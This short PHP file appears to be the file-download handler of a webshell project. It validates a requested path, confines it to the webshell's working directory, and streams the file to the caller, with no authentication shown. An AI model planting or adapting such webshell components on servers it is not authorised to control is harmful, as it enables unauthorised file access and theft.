<?php
if (!function_exists('shells_x_realpath')) {
    require_once __DIR__ . '/helpers.php';
}
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (!is_string($file) || $file === '') {
        http_response_code(400);
        exit;
    }
    $realResult = shells_x_validate_readable_file($file);
    if (isset($realResult['error'])) {
        http_response_code(404);
        exit;
    }
    $real = $realResult['path'];
    // Confine downloads to the webshell's working directory tree.
    $rootResult = shells_x_realpath(getcwd() ?: '.');
    if (isset($rootResult['error']) || !shells_x_is_path_allowed($real, [$rootResult['path']])) {
        http_response_code(403);
        exit;
    }
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . str_replace(['"', "\r", "\n"], '', basename($real)) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($real));
    readfile($real);
    exit;
}
